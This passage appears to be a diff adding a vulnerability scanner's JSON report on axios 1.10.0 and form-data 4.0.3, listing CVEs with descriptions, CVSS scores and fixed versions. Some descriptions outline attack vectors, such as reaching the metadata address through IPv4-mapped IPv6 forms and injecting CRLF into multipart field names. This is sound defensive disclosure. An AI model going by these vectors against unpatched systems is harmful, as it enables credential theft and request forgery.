+          "VulnerabilityID": "CVE-2026-44486",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.16.0, 0.32.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44486",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: Information disclosure of proxy credentials via HTTP redirects",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios’ Node.js HTTP adapter can leak proxy credentials to a redirect target in affected versions. When a request is sent through an authenticated proxy, Axios may add a Proxy-Authorization header. If Axios then follows a redirect and the redirected request is no longer sent through that proxy, the stale Proxy-Authorization header can remain on the redirected request and be sent to the redirect target. This affects Node.js's use of Axios with automatic redirects enabled and an authenticated proxy configuration. Browser adapters are not affected. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-200",
+            "CWE-201"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:26234",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:27063",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/security/cve/CVE-2026-44486",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487947",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/commit/afca61a070728e717203c2bc21e7b589b59b858b",
+            "https://github.com/axios/axios/pull/10794",
+            "https://github.com/axios/axios/releases/tag/v0.32.0",
+            "https://github.com/axios/axios/releases/tag/v1.16.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-j5f8-grm9-p9fc",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44486",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44486.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44486"
+          ],
+          "PublishedDate": "2026-06-11T17:16:32.45Z",
+          "LastModifiedDate": "2026-07-02T12:17:22.64Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44487",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.16.0, 0.32.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44487",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: Information disclosure of proxy credentials via redirect flows",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios’s Node.js HTTP adapter may forward a Proxy-Authorization header to a redirected origin during specific proxy-to-direct redirect flows. This affects Node.js usage, where an initial HTTP request is sent through an authenticated HTTP proxy, redirects are followed, and the redirected URL is no longer proxied. Under affected redirect shapes, the final origin can receive the proxy credential that was intended only for the outbound proxy. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-201"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:26234",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:27063",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:29864",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:34374",
+            "https://access.redhat.com/errata/RHSA-2026:34525",
+            "https://access.redhat.com/errata/RHSA-2026:34527",
+            "https://access.redhat.com/errata/RHSA-2026:34530",
+            "https://access.redhat.com/security/cve/CVE-2026-44487",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487948",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/releases/tag/v0.32.0",
+            "https://github.com/axios/axios/releases/tag/v1.16.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-p92q-9vqr-4j8v",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44487",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44487.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44487"
+          ],
+          "PublishedDate": "2026-06-11T17:16:32.607Z",
+          "LastModifiedDate": "2026-07-02T12:17:22.943Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44488",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.16.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44488",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: Denial of Service due to unenforced request and response size limits",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Axios versions 1.7.0 through 1.15.x did not enforce configured request and response size limits when requests were sent with the fetch adapter. Applications that selected adapter: 'fetch', or ran in environments where axios resolved to the fetch adapter, could receive or send bodies larger than maxContentLength or maxBodyLength despite those limits being explicitly configured. This can cause resource exhaustion in server-side usage when a malicious or compromised server returns an oversized response, when an attacker can supply a large data: URL, or when an application forwards attacker-controlled request bodies through axios while relying on maxBodyLength as a boundary. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:26234",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:27063",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:34160",
+            "https://access.redhat.com/errata/RHSA-2026:34374",
+            "https://access.redhat.com/errata/RHSA-2026:34525",
+            "https://access.redhat.com/errata/RHSA-2026:34527",
+            "https://access.redhat.com/errata/RHSA-2026:34530",
+            "https://access.redhat.com/security/cve/CVE-2026-44488",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487949",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/pull/10795",
+            "https://github.com/axios/axios/pull/10796",
+            "https://github.com/axios/axios/releases/tag/v1.16.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-777c-7fjr-54vf",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44488",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44488.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44488"
+          ],
+          "PublishedDate": "2026-06-11T17:16:32.75Z",
+          "LastModifiedDate": "2026-07-02T12:17:23.233Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44492",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.16.0, 0.32.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44492",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: Proxy bypass via IPv4-mapped IPv6 address non-normalization",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios does not normalise IPv4-mapped IPv6 addresses. When NO_PROXY lists an IPv4 address such as 127.0.0.1 or 169.254.169.254, a request URL using the IPv4-mapped IPv6 form (::ffff:7f00:1, ::ffff:a9fe:a9fe) still routes through the configured proxy. Node.js resolves these addresses to the underlying IPv4 host, so the request reaches the internal service via the proxy rather than being blocked. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-918",
+            "CWE-289"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+              "V3Score": 8.6
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+              "V3Score": 8.6
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:26234",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:27063",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33005",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/security/cve/CVE-2026-44492",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487938",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/security/advisories/GHSA-pjwm-pj3p-43mv",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-62718",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44492",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44492.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44492"
+          ],
+          "PublishedDate": "2026-06-11T17:16:33.167Z",
+          "LastModifiedDate": "2026-07-02T12:17:23.52Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44494",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.16.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44494",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: Man-in-the-Middle (MITM) attack via Prototype Pollution",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. From 1.0.0 to before 1.16.0, the Axios library is vulnerable to a Prototype Pollution \"Gadget\" attack that allows any Object.prototype pollution in the application's dependency tree to be escalated into a full Man-in-the-Middle (MITM) attack — intercepting, reading, and modifying all HTTP traffic including authentication credentials. The HTTP adapter at lib/adapters/http.js:670 reads config.proxy via standard property access, which traverses the prototype chain. Because proxy is not present in Axios defaults, the merged config object has no own proxy property, making it trivially injectable via prototype pollution. Once injected, setProxy() routes all HTTP requests through the attacker's proxy server. This vulnerability is fixed in 1.16.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-441",
+            "CWE-1321",
+            "CWE-915"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
+              "V3Score": 8.7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
+              "V3Score": 8.7
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:26234",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:29800",
+            "https://access.redhat.com/errata/RHSA-2026:29864",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33005",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:34525",
+            "https://access.redhat.com/errata/RHSA-2026:34527",
+            "https://access.redhat.com/errata/RHSA-2026:34530",
+            "https://access.redhat.com/security/cve/CVE-2026-44494",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487942",
+            "https://github.com/advisories/GHSA-fvcv-3m26-pcqx",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/security/advisories/GHSA-35jp-ww65-95wh",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44494",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44494.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44494"
+          ],
+          "PublishedDate": "2026-06-11T17:16:33.313Z",
+          "LastModifiedDate": "2026-07-02T12:17:23.807Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44495",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.15.2, 0.31.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44495",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: Information disclosure due to prototype pollution vulnerability",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. From 0.19.0 to before 0.31.1 and 1.15.2, Axios contains prototype-pollution gadgets in request config processing. If another vulnerability in the same JavaScript process has already polluted Object.prototype.transformResponse, affected Axios versions may treat that inherited value as request configuration or as an option validator. Axios does not itself create the prototype pollution. Exploitability requires a separate prototype-pollution vulnerability or equivalent attacker control over Object.prototype before Axios creates a request. This vulnerability is fixed in 0.31.1 and 1.15.2.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-94",
+            "CWE-1321",
+            "CWE-915"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:L",
+              "V3Score": 7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:L",
+              "V3Score": 7
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:26234",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:27063",
+            "https://access.redhat.com/errata/RHSA-2026:27944",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:34160",
+            "https://access.redhat.com/errata/RHSA-2026:34374",
+            "https://access.redhat.com/security/cve/CVE-2026-44495",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487937",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/security/advisories/GHSA-3g43-6gmg-66jw",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44495",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44495.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44495"
+          ],
+          "PublishedDate": "2026-06-11T17:16:33.45Z",
+          "LastModifiedDate": "2026-07-02T12:17:24.107Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44496",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.16.0, 0.32.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44496",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: Client-side Denial of Service via unescaped regex metacharacters in XSRF cookie name",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Axios versions before 0.32.0 on the 0.x line and before 1.16.0 on the 1.x line build a regular expression from the configured XSRF cookie name without escaping regex metacharacters. In standard browser environments, an attacker who can influence the cookie name passed to axios can cause expensive regex backtracking while axios reads document.cookie. The practical impact is client-side availability degradation, such as freezing the affected browser tab while axios prepares a request. The issue does not affect ordinary Node.js HTTP adapter usage, React Native, or web workers, where axios does not read document.cookie. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400",
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:26234",
+            "https://access.redhat.com/errata/RHSA-2026:27044",
+            "https://access.redhat.com/errata/RHSA-2026:27063",
+            "https://access.redhat.com/errata/RHSA-2026:28571",
+            "https://access.redhat.com/errata/RHSA-2026:28964",
+            "https://access.redhat.com/errata/RHSA-2026:29082",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:30076",
+            "https://access.redhat.com/errata/RHSA-2026:30650",
+            "https://access.redhat.com/errata/RHSA-2026:30651",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:33683",
+            "https://access.redhat.com/security/cve/CVE-2026-44496",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2487943",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/releases/tag/v0.32.0",
+            "https://github.com/axios/axios/releases/tag/v1.16.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-hfxv-24rg-xrqf",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44496",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44496.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44496"
+          ],
+          "PublishedDate": "2026-06-11T17:16:33.59Z",
+          "LastModifiedDate": "2026-07-02T12:17:24.467Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2025-7783",
+          "PkgID": "form-data@4.0.3",
+          "PkgName": "form-data",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/form-data@4.0.3",
+            "UID": "a9814ad6417e0b8c"
+          },
+          "InstalledVersion": "4.0.3",
+          "FixedVersion": "2.5.4, 3.0.4, 4.0.4",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-7783",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "form-data: Unsafe random function in form-data",
+          "Description": "Use of Insufficiently Random Values vulnerability in form-data allows HTTP Parameter Pollution (HPP). This vulnerability is associated with program files lib/form_data.Js.\n\nThis issue affects form-data: \u003c 2.5.4, 3.0.0 - 3.0.3, 4.0.0 - 4.0.3.",
+          "Severity": "CRITICAL",
+          "CweIDs": [
+            "CWE-330"
+          ],
+          "VendorSeverity": {
+            "ghsa": 4,
+            "redhat": 2,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
+              "V40Score": 9.4
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N",
+              "V3Score": 5.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2025-7783",
+            "https://github.com/benweissmann/CVE-2025-7783-poc",
+            "https://github.com/form-data/form-data",
+            "https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0",
+            "https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4",
+            "https://lists.debian.org/debian-lts-announce/2025/07/msg00023.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-7783",
+            "https://ubuntu.com/security/notices/USN-7976-1",
+            "https://www.cve.org/CVERecord?id=CVE-2025-7783"
+          ],
+          "PublishedDate": "2025-07-18T17:15:44.747Z",
+          "LastModifiedDate": "2026-06-17T10:05:39.033Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-12143",
+          "PkgID": "form-data@4.0.3",
+          "PkgName": "form-data",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/form-data@4.0.3",
+            "UID": "a9814ad6417e0b8c"
+          },
+          "InstalledVersion": "4.0.3",
+          "FixedVersion": "2.5.6, 3.0.5, 4.0.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-12143",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "form-data: form-data: Form field override via CRLF injection",
+          "Description": "form-data is a library for creating readable multipart/form-data streams. In versions through 4.0.5, the `field` argument to `FormData#append` and the `filename` option are concatenated verbatim into the `Content-Disposition` header without escaping carriage return (CR), line feed (LF), or double-quote (\") characters. An application that passes attacker-controlled data as a field name or filename (for example, an API gateway that turns JSON object keys into multipart field names) allows the attacker to terminate the header line and inject additional headers, or to smuggle entire additional multipart parts, into the request the application forwards to a backend. This can let the attacker add or override form fields (e.g. set `is_admin=true`) seen by the downstream parser. This is an instance of CWE-93 (CRLF injection). The fix escapes CR, LF, and `\"` as `%0D`, `%0A`, and `%22` in field names and filenames, matching the serialization browsers use per the WHATWG HTML multipart/form-data encoding algorithm. Exploitation requires the consuming application to use untrusted input as a field name or filename; applications that use only fixed/trusted field names are not affected. Fixed in 2.5.6, 3.0.5, and 4.0.6.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-93"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+              "V3Score": 7.5,
+              "V40Score": 8.7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:34342",
+            "https://access.redhat.com/security/cve/CVE-2026-12143",
